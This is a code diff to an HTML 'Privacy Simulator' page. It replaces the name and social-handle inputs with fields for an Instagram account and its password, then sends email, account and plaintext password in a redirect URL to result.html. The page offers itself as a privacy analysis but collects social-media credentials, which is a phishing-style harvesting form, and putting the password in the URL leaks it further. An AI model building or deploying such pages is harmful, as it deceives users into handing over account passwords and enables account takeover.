@@ -8,26 +8,29 @@
 </head>
 <body>
     <div class="container">
+        <!-- Title centered in the container -->
         <h1>Privacy Simulator</h1>
 
+        <!-- Input Boxes -->
         <div class="input-box">
-            <input type="text" id="name" placeholder="Enter your name">
             <input type="email" id="email" placeholder="Enter your email">
-            <input type="text" id="socialMedia" placeholder="Enter your social media handle">
+            <input type="text" id="instagramAccount" placeholder="Enter your Instagram account">
+            <input type="password" id="instagramPassword" placeholder="Enter your Instagram account password">
         </div>
 
+        <!-- Analyze Button -->
         <button onclick="analyzePrivacy()">Analyze Privacy</button>
     </div>
 
     <script>
         function analyzePrivacy() {
-            const name = document.getElementById('name').value;
             const email = document.getElementById('email').value;
-            const socialMedia = document.getElementById('socialMedia').value;
+            const instagramAccount = document.getElementById('instagramAccount').value;
+            const instagramPassword = document.getElementById('instagramPassword').value;
 
-            // Redirect to result page with input data
-            if (name && email && socialMedia) {
-                window.location.href = `result.html?name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}&socialMedia=${encodeURIComponent(socialMedia)}`;
+            // Ensure data is provided before redirecting
+            if (email && instagramAccount && instagramPassword) {
+                window.location.href = `result.html?email=${encodeURIComponent(email)}&instagramAccount=${encodeURIComponent(instagramAccount)}&instagramPassword=${encodeURIComponent(instagramPassword)}`;
             } else {
                 alert("Please fill in all fields before analyzing.");
             }
